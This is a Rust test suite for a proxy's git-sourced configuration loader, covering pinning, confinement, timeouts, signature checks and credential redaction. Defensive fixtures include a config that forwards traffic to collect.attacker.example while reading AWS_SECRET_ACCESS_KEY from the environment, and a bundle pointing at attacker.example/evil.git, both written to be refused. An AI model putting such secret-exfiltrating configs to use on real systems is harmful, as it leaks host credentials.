// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Soap Bucket LLC

//! Git config-source resolution, against a repository on this disk.
//!
//! No network. Every test creates a real repository in a temp directory
//! and serves it over `file://`, which is deliberate rather than
//! convenient: `file://` goes through git's smart transport, so a
//! single-commit fetch of an arbitrary sha is refused exactly the way a
//! real server without `uploadpack.allowReachableSHA1InWant` refuses it,
//! and the loader's full-fetch fallback is on the tested path rather than
//! on a path that only production reaches.
//!
//! The suite skips itself, loudly, on a host with no `git`. That is the
//! same dependency the feature has at runtime, and a test that quietly
//! passes without exercising anything is worse than one that says why.

use std::path::{Path, PathBuf};
use std::process::Command;
use std::time::{Duration, Instant};

use sbproxy_config::config_merge::{
    denied_paths_in, merge_config, BaseOrigin, MergeMode, Provenance,
};
use sbproxy_config::source::{
    load_source_blocking, ConfigSourceError, FetchContext, ResolvedDocument,
};
use sbproxy_config::types::ConfigSource;

/// A config that compiles, so a resolution failure is never confused
/// with a compile failure.
const REPO_CONFIG: &str = "proxy:\n  http_bind_port: 8080\norigins:\n  \
                           \"edge.example.com\":\n    action:\n      type: proxy\n      \
                           url: https://test.sbproxy.dev\n";

/// A second config, so a moved branch is observably a different
/// document and not only a different sha.
const REPO_CONFIG_V2: &str = "proxy:\n  http_bind_port: 9090\norigins:\n  \
                              \"edge.example.com\":\n    action:\n      type: proxy\n      \
                              url: https://test.sbproxy.dev\n";

/// A document that names a per-node value the way
/// docs/configuration.md's "Node identity in a shared repository"
/// documents it. Confinement leaves this form alone; the two tests above
/// pin the forms it does not.
const REPO_CONFIG_WITH_ENV: &str = r#"proxy:
  http_bind_port: 8080
origins:
  "edge.example.com":
    action:
      type: static
      status_code: 200
      content_type: text/plain
      body: "${SB_DEFINITELY_UNSET_XYZZY:-fallback}"
"#;

/// Assert that a `SB_TEST_UNSET_*` variable really is unset.
///
/// These names are reserved-unset: nothing in this workspace ever
/// exports them, and the tests below rely on them resolving to
/// nothing. Asserting is a read, so it cannot race a parallel test's
/// `getenv` the way the `remove_var` it replaces could (WOR-646); a
/// failure here means a shell or another process exported a reserved
/// name, which deserves a loud message rather than a silent scrub.
fn assert_env_unset(name: &str) {
    assert!(
        std::env::var_os(name).is_none(),
        "{name} is reserved-unset for this suite; unset it in the invoking shell"
    );
}

/// Whether `git` can be run here at all.
fn git_available() -> bool {
    Command::new("git")
        .arg("--version")
        .output()
        .map(|out| out.status.success())
        .unwrap_or(false)
}

/// Skip guard. Returns `false` and prints why when `git` is absent.
fn require_git(test: &str) -> bool {
    if git_available() {
        return true;
    }
    eprintln!("skipping {test}: no usable `git` binary on this host");
    false
}

/// Run `git args...` in `dir`, panicking with the captured output on
/// failure so a broken fixture is legible.
fn git(dir: &Path, args: &[&str]) -> String {
    let out = Command::new("git")
        .args(args)
        .current_dir(dir)
        .output()
        .unwrap_or_else(|e| panic!("spawn git {args:?}: {e}"));
    assert!(
        out.status.success(),
        "git {args:?} in {} failed: {}{}",
        dir.display(),
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr),
    );
    String::from_utf8_lossy(&out.stdout).trim().to_string()
}

/// A repository on this disk, with a work tree and at least one commit.
struct Fixture {
    /// Keeps the directory alive for the test's lifetime.
    _dir: tempfile::TempDir,
    work: PathBuf,
}

impl Fixture {
    /// Create a repository on branch `main` with one commit adding
    /// `sb.yml`.
    fn new(config: &str) -> Self {
        let dir = tempfile::tempdir().expect("tempdir");
        let work = dir.path().join("repo");
        std::fs::create_dir_all(&work).expect("mkdir work tree");
        git(&work, &["init", "--quiet"]);
        // `init -b main` needs git 2.28; setting HEAD works on every
        // version and does not depend on the host's init.defaultBranch.
        git(&work, &["symbolic-ref", "HEAD", "refs/heads/main"]);
        git(&work, &["config", "user.email", "fixture@example.test"]);
        git(&work, &["config", "user.name", "Fixture"]);
        // A host-level `commit.gpgsign = true` would otherwise make every
        // fixture commit prompt for a passphrase and hang.
        git(&work, &["config", "commit.gpgsign", "false"]);
        git(&work, &["config", "tag.gpgsign", "false"]);
        let fixture = Self { _dir: dir, work };
        fixture.commit(config, "initial config");
        fixture
    }

    /// Write `sb.yml` and commit it, returning the new commit sha.
    fn commit(&self, config: &str, message: &str) -> String {
        std::fs::write(self.work.join("sb.yml"), config).expect("write sb.yml");
        git(&self.work, &["add", "sb.yml"]);
        git(&self.work, &["commit", "--quiet", "-m", message]);
        self.head()
    }

    /// The current commit sha.
    fn head(&self) -> String {
        git(&self.work, &["rev-parse", "HEAD"])
    }

    /// The `file://` URL a loader clones from.
    fn url(&self) -> String {
        format!("file://{}", self.work.display())
    }
}

/// A `Git` source with the loader's defaults, so each test spells out
/// only what it is about.
fn git_source(repo: &str, revision: Option<&str>) -> ConfigSource {
    ConfigSource::Git {
        repo: repo.to_string(),
        revision: revision.map(str::to_string),
        path: "sb.yml".to_string(),
        credential: None,
        verify_signature: false,
        confine: false,
        timeout_secs: 120,
        refresh_interval_secs: 60,
    }
}

/// The same source with `confine: true`, the opt-in that says the
/// repository is written by somebody other than whoever runs this proxy.
fn confined_git_source(repo: &str, revision: Option<&str>) -> ConfigSource {
    let mut source = git_source(repo, revision);
    if let ConfigSource::Git { confine, .. } = &mut source {
        *confine = true;
    }
    source
}

fn resolve(source: &ConfigSource) -> Result<ResolvedDocument, ConfigSourceError> {
    load_source_blocking(source, "", &FetchContext::with_git_binary())
}

// --- resolve and compile ---------------------------------------------

#[test]
fn a_git_source_resolves_and_compiles() {
    if !require_git("a_git_source_resolves_and_compiles") {
        return;
    }
    let fixture = Fixture::new(REPO_CONFIG);
    let resolved = resolve(&git_source(&fixture.url(), Some("main"))).expect("resolves");
    assert_eq!(resolved.text, REPO_CONFIG);
    assert!(resolved.is_remote());
    assert_eq!(resolved.revisions.len(), 1);
    assert_eq!(resolved.revisions[0].commit, fixture.head());
    assert_eq!(resolved.revisions[0].reference, "main");

    let compiled = sbproxy_config::compile_config(&resolved.text).expect("compiles");
    assert!(compiled.host_map.contains_key("edge.example.com"));
    assert_eq!(compiled.server.http_bind_port, 8080);
}

#[test]
fn no_revision_resolves_the_default_branch() {
    if !require_git("no_revision_resolves_the_default_branch") {
        return;
    }
    let fixture = Fixture::new(REPO_CONFIG);
    let resolved = resolve(&git_source(&fixture.url(), None)).expect("resolves");
    assert_eq!(resolved.revisions[0].commit, fixture.head());
    assert_eq!(resolved.revisions[0].reference, "HEAD");
}

// --- change detection: the commit is the ETag ------------------------

#[test]
fn an_unchanged_branch_resolves_to_the_same_fingerprint() {
    if !require_git("an_unchanged_branch_resolves_to_the_same_fingerprint") {
        return;
    }
    let fixture = Fixture::new(REPO_CONFIG);
    let source = git_source(&fixture.url(), Some("main"));
    let first = resolve(&source).expect("first resolve");
    let second = resolve(&source).expect("second resolve");
    assert_eq!(
        first.revision_fingerprint(),
        second.revision_fingerprint(),
        "an unchanged branch must produce an unchanged fingerprint, which is what makes the \
         refresh path skip the recompile and the reload",
    );
}

#[test]
fn a_moved_branch_changes_the_fingerprint() {
    if !require_git("a_moved_branch_changes_the_fingerprint") {
        return;
    }
    let fixture = Fixture::new(REPO_CONFIG);
    let source = git_source(&fixture.url(), Some("main"));
    let before = resolve(&source).expect("first resolve");
    fixture.commit(REPO_CONFIG_V2, "move the branch");
    let after = resolve(&source).expect("second resolve");
    assert_ne!(before.revision_fingerprint(), after.revision_fingerprint());
    assert_eq!(after.text, REPO_CONFIG_V2);
}

// --- SHA pinning -----------------------------------------------------

#[test]
fn a_pinned_sha_refuses_to_follow_a_moved_branch() {
    if !require_git("a_pinned_sha_refuses_to_follow_a_moved_branch") {
        return;
    }
    let fixture = Fixture::new(REPO_CONFIG);
    let pinned = fixture.head();
    fixture.commit(REPO_CONFIG_V2, "move the branch past the pin");
    assert_ne!(fixture.head(), pinned, "fixture must have moved");

    let resolved = resolve(&git_source(&fixture.url(), Some(&pinned))).expect("pinned resolve");
    assert_eq!(
        resolved.revisions[0].commit, pinned,
        "the pin, not the branch tip",
    );
    assert_eq!(
        resolved.text, REPO_CONFIG,
        "a pin that silently served the branch tip would be no pin at all",
    );
    assert_eq!(
        resolved.revision_fingerprint(),
        pinned,
        "the fingerprint stays put, so a pinned node never reloads on someone else's push",
    );
}

#[test]
fn a_pin_naming_a_commit_this_repository_does_not_have_is_refused() {
    if !require_git("a_pin_naming_a_commit_this_repository_does_not_have_is_refused") {
        return;
    }
    let fixture = Fixture::new(REPO_CONFIG);
    let absent = "0".repeat(40);
    let error =
        resolve(&git_source(&fixture.url(), Some(&absent))).expect_err("absent commit must fail");
    assert!(
        matches!(
            error,
            ConfigSourceError::RevisionMismatch(_) | ConfigSourceError::Clone(_)
        ),
        "{error:?}",
    );
    assert!(error.to_string().contains(&absent), "{error}");
}

// --- confinement (WOR-2433) ------------------------------------------

#[test]
fn a_git_document_reading_this_hosts_environment_is_refused() {
    // Named against the loader, not the checker: `check_confined_document`
    // being correct proves nothing about this branch calling it, and this
    // branch is the only place in the loader where config text arrives
    // from a party that is not the host owner.
    if !require_git("a_git_document_reading_this_hosts_environment_is_refused") {
        return;
    }
    let fixture = Fixture::new(
        r#"origins:
  "exfil.test":
    action:
      type: proxy
      url: https://collect.attacker.example
    authentication:
      type: api_key
      api_key: "env:AWS_SECRET_ACCESS_KEY"
"#,
    );
    let error = resolve(&confined_git_source(&fixture.url(), Some("main")))
        .expect_err("a confined repository may not name this host's environment");
    assert!(
        matches!(error, ConfigSourceError::Confinement(_)),
        "{error:?}",
    );
    assert_eq!(error.metric_label(), "confinement_refused");
    assert!(
        !error.is_unreachable(),
        "the remote was reached; its content was refused"
    );
    assert!(error.to_string().contains("env:NAME"), "{error}");
}

#[test]
fn a_git_document_naming_a_host_path_is_refused() {
    if !require_git("a_git_document_naming_a_host_path_is_refused") {
        return;
    }
    let fixture = Fixture::new(
        r#"origins:
  "edge.example.com":
    request_modifiers:
      - rego_module_path: /etc/sbproxy/anything.rego
"#,
    );
    let error = resolve(&confined_git_source(&fixture.url(), Some("main")))
        .expect_err("a confined repository may not name a path on the host that compiles it");
    assert!(
        matches!(error, ConfigSourceError::Confinement(_)),
        "{error:?}",
    );
}

#[test]
fn a_git_document_may_still_name_per_node_variables() {
    // Confinement must not have taken away the documented and only
    // supported way to run one shared repository across a fleet.
    if !require_git("a_git_document_may_still_name_per_node_variables") {
        return;
    }
    let fixture = Fixture::new(REPO_CONFIG_WITH_ENV);
    let resolved = resolve(&git_source(&fixture.url(), Some("main")))
        .expect("a per-node `${VAR}` stays legal in a git-sourced document");
    assert_eq!(
        resolved.text, REPO_CONFIG_WITH_ENV,
        "the loader must return the document byte for byte, not a rewritten copy",
    );
}

#[test]
fn an_unconfined_git_document_keeps_the_documented_secret_spellings() {
    // The default, and the reason it is the default. On a git-sourced
    // node the local file is a pointer, so "declare the value in the
    // config the operator owns" has nowhere to go, and `env:NAME` is the
    // only spelling `proxy.cluster.security.shared_key` accepts
    // (docs/secrets.md) as well as the one the Kubernetes operator
    // generates. Sealing this by default would take a clustered GitOps
    // node down on upgrade with no legal spelling left, which is what
    // the first cut of this change did (WOR-2433 re-review).
    if !require_git("an_unconfined_git_document_keeps_the_documented_secret_spellings") {
        return;
    }
    let document = r#"proxy:
  http_bind_port: 8080
  cluster:
    security:
      shared_key: "env:SB_CLUSTER_SHARED_KEY"
origins:
  "edge.example.com":
    action:
      type: proxy
      url: https://test.sbproxy.dev
    authentication:
      type: api_key
      api_key: "file:/run/secrets/api-key"
    request_modifiers:
      - rego_module_path: /etc/sbproxy/policy.rego
"#;
    let fixture = Fixture::new(document);

    let resolved = resolve(&git_source(&fixture.url(), Some("main")))
        .expect("an ordinary git source is the operator's own config store");

    assert_eq!(
        resolved.text, document,
        "the loader must return the document byte for byte",
    );
}

#[test]
fn a_confined_documents_yaml_error_is_invalid_not_a_confinement_refusal() {
    // The confinement check is the first parse of a fetched document, so
    // without this it reports a plain YAML typo as a security refusal and
    // climbs a counter that is supposed to mean "somebody tried to reach
    // this host" (WOR-2433 re-review).
    if !require_git("a_confined_documents_yaml_error_is_invalid_not_a_confinement_refusal") {
        return;
    }
    let fixture = Fixture::new("origins:\n  \"edge.example.com\"\n    action: [unclosed\n");

    let error = resolve(&confined_git_source(&fixture.url(), Some("main")))
        .expect_err("a malformed document must fail");

    assert!(matches!(error, ConfigSourceError::Invalid(_)), "{error:?}");
    assert_eq!(error.metric_label(), "invalid");
}

// --- failure modes ---------------------------------------------------

#[test]
fn an_unreachable_remote_is_reported_as_unreachable() {
    if !require_git("an_unreachable_remote_is_reported_as_unreachable") {
        return;
    }
    let missing = tempfile::tempdir().expect("tempdir");
    let url = format!("file://{}/not-a-repository", missing.path().display());
    let error = resolve(&git_source(&url, Some("main"))).expect_err("missing repo must fail");
    assert!(error.is_unreachable(), "{error:?}");
    assert_eq!(error.metric_label(), "unreachable");
}

#[test]
fn a_missing_git_binary_is_a_named_preflight_failure() {
    let ctx = FetchContext::with_git_binary_at("/nonexistent/sbproxy-test-git");
    let source = git_source("file:///does/not/matter", None);
    let error =
        load_source_blocking(&source, "", &ctx).expect_err("a missing git binary must fail");
    assert!(
        matches!(error, ConfigSourceError::MissingGitBinary(_)),
        "{error:?} should name the dependency, not report a confusing clone error",
    );
    let text = error.to_string();
    assert!(text.contains("git"), "{text}");
    assert!(text.contains("installed"), "{text}");
}

/// A stand-in `git` that answers `--version` and then hangs, so the
/// loader's hard timeout is the only thing that can end the call.
#[cfg(unix)]
fn write_hanging_git(dir: &Path) -> PathBuf {
    use std::os::unix::fs::PermissionsExt as _;
    let path = dir.join("git");
    // ~20 seconds rather than something enormous: killing the shell leaves
    // the `sleep` it spawned as an orphan, and an orphan that goes away on
    // its own is better manners in CI than one that lingers for minutes.
    // Any value comfortably above the one-second timeout under test works.
    // The fractional digits make the duration unique to this fixture
    // directory (see `fixture_nap_duration`), so the orphan's own `ps`
    // command line carries a token no concurrent test reproduces.
    // Matching on a bare `sleep 20` instead let a concurrent test's
    // fixture (this file's sibling timeout test runs the same script in
    // its own process) appear between the leak test's before and after
    // snapshots and read as a leak, which is exactly the load-only flake
    // that test kept producing in the gate. A copy of the system `sleep`
    // inside the tempdir would carry the marker too, but macOS SIGKILLs
    // platform binaries executed from outside the sealed system volume,
    // so the marker rides in the argument instead.
    // The trailing `exit` keeps the shell from exec-replacing itself with
    // the final command, so the sleeper is always a grandchild, which is
    // the process this fixture exists to orphan.
    std::fs::write(
        &path,
        format!(
            "#!/bin/sh\ncase \"$1\" in\n  --version) echo 'git version 2.99.0'; exit 0;;\nesac\n\
             sleep {}\nexit 0\n",
            fixture_nap_duration(dir)
        ),
    )
    .expect("write fake git");
    let mut permissions = std::fs::metadata(&path)
        .expect("stat fake git")
        .permissions();
    permissions.set_mode(0o755);
    std::fs::set_permissions(&path, permissions).expect("chmod fake git");
    path
}

/// A hanging fetch must not leave its grandchildren running.
///
/// The fake `git` is a shell script, so the process the loader spawns is
/// `sh` and the thing that actually sleeps is a child of that shell.
/// Killing only the direct child reaps the shell and orphans the sleep,
/// which then survives with the loader's scratch files still open. In
/// production that is a process leaked on every reload against a hung
/// remote, and a scratch directory that cannot be cleaned while it is
/// held.
///
/// Asserted by pid rather than by a `pgrep` sweep so a concurrent test
/// running its own fixture cannot make this pass or fail by accident.
#[cfg(unix)]
#[test]
fn a_hanging_fetch_leaves_no_orphaned_grandchild() {
    let dir = tempfile::tempdir().expect("tempdir");
    let fake_git = write_hanging_git(dir.path());
    let ctx = FetchContext::with_git_binary_at(&fake_git);
    let mut source = git_source("file:///irrelevant", Some("main"));
    if let ConfigSource::Git { timeout_secs, .. } = &mut source {
        *timeout_secs = 1;
    }

    let before = sleeping_pids_under(dir.path());
    let _ = load_source_blocking(&source, "", &ctx).expect_err("a hanging fetch must fail");

    // The kill is asynchronous; give the group a moment to die before
    // concluding it did not. Far below the fixture's own 20s sleep, so a
    // surviving orphan is still unambiguous.
    std::thread::sleep(Duration::from_millis(500));

    let after = sleeping_pids_under(dir.path());
    let leaked: Vec<_> = after.difference(&before).collect();
    assert!(
        leaked.is_empty(),
        "the timeout leaked {} orphaned process(es): {leaked:?}",
        leaked.len(),
    );
}

/// Sleep duration unique to the fixture at `dir`.
///
/// Derived from the fixture directory with a fixed-key hasher, so
/// `write_hanging_git` and `sleeping_pids_under` compute the same value
/// while no concurrent test (which owns a different tempdir) can
/// produce it. This is what lets the leak sweep recognize the orphaned
/// `sleep` by its own command line, which otherwise carries no trace of
/// the fixture that spawned it.
#[cfg(unix)]
fn fixture_nap_duration(dir: &Path) -> String {
    use std::hash::{Hash, Hasher as _};
    let mut hasher = std::collections::hash_map::DefaultHasher::new();
    dir.hash(&mut hasher);
    format!("20.{:09}", hasher.finish() % 1_000_000_000)
}

/// Pids of processes spawned by the fake git in `scratch`.
///
/// Matches only on tokens unique to this fixture: the fixture's own
/// directory, which the shell carries in its command line (it runs the
/// script at `<scratch>/git`), and the fixture-unique nap duration the
/// orphaned `sleep` carries in its argument. A concurrent test's
/// fixture reproduces neither. Returns an empty set when `ps` is
/// unavailable rather than failing, since the assertion above is about
/// what is left over.
#[cfg(unix)]
fn sleeping_pids_under(scratch: &Path) -> std::collections::BTreeSet<u32> {
    let marker = scratch.to_string_lossy().to_string();
    let nap = format!("sleep {}", fixture_nap_duration(scratch));
    let out = Command::new("ps")
        .args(["-eo", "pid=,ppid=,command="])
        .output();
    let Ok(out) = out else {
        return Default::default();
    };
    String::from_utf8_lossy(&out.stdout)
        .lines()
        .filter(|line| line.contains(&marker) || line.contains(&nap))
        .filter_map(|line| line.split_whitespace().next()?.parse::<u32>().ok())
        .collect()
}

#[cfg(unix)]
#[test]
fn a_fetch_that_hangs_is_killed_at_the_timeout() {
    let dir = tempfile::tempdir().expect("tempdir");
    let fake_git = write_hanging_git(dir.path());
    let ctx = FetchContext::with_git_binary_at(&fake_git);
    let mut source = git_source("file:///irrelevant", Some("main"));
    if let ConfigSource::Git { timeout_secs, .. } = &mut source {
        *timeout_secs = 1;
    }

    let started = Instant::now();
    let error = load_source_blocking(&source, "", &ctx).expect_err("a hanging fetch must fail");
    let elapsed = started.elapsed();

    assert!(
        matches!(error, ConfigSourceError::Timeout(_)),
        "{error:?} must be a timeout",
    );
    assert_eq!(error.metric_label(), "timeout");
    assert!(
        elapsed < Duration::from_secs(30),
        "the child must be killed at the timeout, not waited out: {elapsed:?}",
    );
}

#[test]
fn verify_signature_refuses_an_unsigned_commit() {
    if !require_git("verify_signature_refuses_an_unsigned_commit") {
        return;
    }
    let fixture = Fixture::new(REPO_CONFIG);
    let mut source = git_source(&fixture.url(), Some("main"));
    if let ConfigSource::Git {
        verify_signature, ..
    } = &mut source
    {
        *verify_signature = true;
    }
    let error = resolve(&source).expect_err("an unsigned commit must be refused");
    assert!(
        matches!(error, ConfigSourceError::Signature(_)),
        "{error:?}"
    );
    assert_eq!(error.metric_label(), "verify_failed");
    // The same repository resolves fine with verification off, so the
    // refusal is about the signature and nothing else.
    resolve(&git_source(&fixture.url(), Some("main"))).expect("resolves unverified");
}

// --- credentials -----------------------------------------------------

#[test]
fn a_credential_never_appears_in_an_error_message() {
    if !require_git("a_credential_never_appears_in_an_error_message") {
        return;
    }
    // An https URL, so the credential is actually interpolated into what
    // the child process is handed. The host does not resolve, which is
    // the point: the failure message is what is under test.
    let repo = "https://sbproxy-invalid.invalid/acme/config.git";
    let mut source = git_source(repo, Some("main"));
    if let ConfigSource::Git { credential, .. } = &mut source {
        *credential = Some("env:SB_TEST_GIT_TOKEN".to_string());
    }
    let ctx = FetchContext::with_git_binary().with_credential(repo, "ghp_supersecrettokenvalue");
    let error = load_source_blocking(&source, "", &ctx).expect_err("unreachable host must fail");
    let text = format!("{error}");
    assert!(
        !text.contains("ghp_supersecrettokenvalue"),
        "the credential leaked into an error message: {text}",
    );
    assert!(text.contains("sbproxy-invalid.invalid"), "{text}");
}

#[test]
fn a_credential_reference_that_was_never_resolved_is_refused() {
    let repo = "https://sbproxy-invalid.invalid/acme/config.git";
    let mut source = git_source(repo, None);
    if let ConfigSource::Git { credential, .. } = &mut source {
        *credential = Some("env:SB_TEST_GIT_TOKEN".to_string());
    }
    let error = load_source_blocking(&source, "", &FetchContext::with_git_binary())
        .expect_err("an unresolved credential must be refused rather than fetched anonymously");
    assert!(matches!(error, ConfigSourceError::Invalid(_)), "{error:?}");
}

// --- layering with a config authority --------------------------------

#[test]
fn a_git_base_and_an_authority_overlay_resolve_in_the_documented_order() {
    if !require_git("a_git_base_and_an_authority_overlay_resolve_in_the_documented_order") {
        return;
    }
    let fixture = Fixture::new(REPO_CONFIG);
    let resolved = resolve(&git_source(&fixture.url(), Some("main"))).expect("resolves");

    // The authority's document changes the port and adds an origin. It
    // wins over git, because git content is the operator's baseline and
    // the authority is the layer the deny list is enforced against.
    let remote = "proxy:\n  http_bind_port: 9999\norigins:\n  \"central.example.com\":\n    \
                  action:\n      type: proxy\n      url: https://test.sbproxy.dev\n";
    let outcome = merge_config(
        &resolved.text,
        resolved.base_origin(),
        remote,
        MergeMode::Overlay,
    )
    .expect("git base merges with an authority overlay");

    let compiled = sbproxy_config::compile_config(&outcome.merged_yaml).expect("merged compiles");
    assert_eq!(
        compiled.server.http_bind_port, 9999,
        "the authority wins over git",
    );
    assert!(
        compiled.host_map.contains_key("edge.example.com"),
        "git origin survives"
    );
    assert!(
        compiled.host_map.contains_key("central.example.com"),
        "authority origin lands"
    );

    // Provenance has three values, and the git leaves carry the repo,
    // the reference, and the resolved commit.
    let git_leaf = outcome
        .provenance
        .get("origins.edge.example.com.action.url")
        .expect("a leaf that came from the git base");
    match git_leaf {
        Provenance::Git {
            repo,
            reference,
            commit,
        } => {
            assert_eq!(repo, &fixture.url());
            assert_eq!(reference, "main");
            assert_eq!(commit, &fixture.head());
        }
        other => panic!("expected Provenance::Git for a git-sourced leaf, got {other:?}"),
    }
    assert_eq!(
        outcome.provenance.get("proxy.http_bind_port"),
        Some(&Provenance::Authority),
        "the overridden leaf is the authority's",
    );
}

#[test]
fn an_authority_bundle_carrying_source_is_rejected() {
    // `source` is on the deny list: the authority overlays a base
    // document and does not get to choose which repository that base
    // comes from, which would let it swap out its own input.
    let payload = "source:\n  kind: git\n  repo: https://attacker.example/evil.git\n  \
                   path: sb.yml\norigins: {}\n";
    let denied = denied_paths_in(payload).expect("payload parses");
    assert_eq!(denied, vec!["source".to_string()]);

    let error = merge_config(REPO_CONFIG, BaseOrigin::Local, payload, MergeMode::Overlay)
        .expect_err("a bundle naming `source` must be rejected in full");
    assert!(error.to_string().contains("source"), "{error}");
}

// --- node identity ---------------------------------------------------

/// A shared-fleet document that names its node identity through
/// `${VAR}`, which is the supported pattern for one repository serving
/// many hosts.
const SHARED_FLEET_CONFIG: &str = "proxy:\n  http_bind_port: 8080\n  cluster:\n    \
                                   cluster_id: prod\n    node_id: ${SB_TEST_UNSET_NODE_ID}\n    \
                                   roles: [gateway]\n    security:\n      mode: shared_key\n      \
                                   development: true\n      shared_key: \
                                   0123456789abcdef0123456789abcdef\norigins: {}\n";

#[test]
fn an_unresolved_node_local_reference_in_a_git_document_is_a_hard_error() {
    if !require_git("an_unresolved_node_local_reference_in_a_git_document_is_a_hard_error") {
        return;
    }
    // A host that forgot to export the variable must not take the
    // literal placeholder text as its node id: it would join the cluster
    // under `${SB_TEST_UNSET_NODE_ID}` and collide with every other host
    // that forgot the same thing.
    let fixture = Fixture::new(SHARED_FLEET_CONFIG);
    let ctx = FetchContext::with_git_binary();
    let pointer = format!(
        "source:\n  kind: git\n  repo: {}\n  revision: main\n  path: sb.yml\n",
        fixture.url()
    );
    assert_env_unset("SB_TEST_UNSET_NODE_ID");

    // `err().expect()` rather than `expect_err`: the latter needs Debug on the
    // Ok type and CompiledConfig does not implement it. Every other expect_err
    // in this file returns a type that does, so they stay as they are.
    let error = sbproxy_config::compile_config_from_source_blocking(&pointer, &ctx)
        .err()
        .expect("an unresolved node-local reference must be a hard error");
    let text = format!("{error:#}");
    assert!(text.contains("proxy.cluster.node_id"), "{text}");
    assert!(text.contains("SB_TEST_UNSET_NODE_ID"), "{text}");
}

#[test]
fn an_unresolved_reference_outside_the_node_local_paths_still_only_warns() {
    if !require_git("an_unresolved_reference_outside_the_node_local_paths_still_only_warns") {
        return;
    }
    // The hard failure is scoped to the block that decides node
    // identity. Everywhere else an unresolved reference stays a warning,
    // because tightening it would break configs that work today.
    let config = "proxy:\n  http_bind_port: 8080\norigins:\n  \"edge.example.com\":\n    \
                  action:\n      type: proxy\n      url: https://test.sbproxy.dev\n    \
                  variables:\n        note: ${SB_TEST_UNSET_NOTE}\n";
    let fixture = Fixture::new(config);
    let pointer = format!(
        "source:\n  kind: git\n  repo: {}\n  revision: main\n  path: sb.yml\n",
        fixture.url()
    );
    assert_env_unset("SB_TEST_UNSET_NOTE");
    sbproxy_config::compile_config_from_source_blocking(&pointer, &FetchContext::with_git_binary())
        .expect("a non-node-local unresolved reference still only warns");
}

#[test]
fn a_local_document_is_not_subject_to_the_node_local_hard_failure() {
    // Only a resolved remote document hard-fails. A hand-edited local
    // file keeps its warn-only behaviour, because the person who wrote it
    // is watching the log and tightening it would break existing
    // configs. The document may still be refused for other reasons; what
    // must not happen is a refusal from this check.
    assert_env_unset("SB_TEST_UNSET_NODE_ID");
    let result = sbproxy_config::compile_config_from_source_blocking(
        SHARED_FLEET_CONFIG,
        &FetchContext::with_git_binary(),
    );
    if let Err(error) = result {
        let text = format!("{error:#}");
        assert!(
            !text.contains("node-local reference"),
            "a local document must not hit the node-local hard failure: {text}",
        );
    }
}

// --- overlay chains --------------------------------------------------

#[test]
fn a_git_overlay_chain_records_every_commit_it_resolved() {
    if !require_git("a_git_overlay_chain_records_every_commit_it_resolved") {
        return;
    }
    let base = Fixture::new(REPO_CONFIG);
    let overlay = Fixture::new("proxy:\n  http_bind_port: 7070\n");
    let source = ConfigSource::GitOverlay {
        base: Box::new(git_source(&base.url(), Some("main"))),
        overlays: vec![git_source(&overlay.url(), Some("main"))],
    };
    let resolved = resolve(&source).expect("overlay chain resolves");
    assert_eq!(resolved.revisions.len(), 2);
    assert_eq!(resolved.revisions[0].commit, base.head());
    assert_eq!(resolved.revisions[1].commit, overlay.head());
    // The base's origin is what provenance reports, since that is the
    // repository an operator means by "where is this config from".
    assert_eq!(
        resolved.base_origin(),
        BaseOrigin::Git {
            repo: base.url(),
            reference: "main".to_string(),
            commit: base.head(),
        }
    );
    let compiled = sbproxy_config::compile_config(&resolved.text).expect("merged compiles");
    assert_eq!(compiled.server.http_bind_port, 7070, "overlay wins");
    assert!(
        compiled.host_map.contains_key("edge.example.com"),
        "base survives"
    );
}
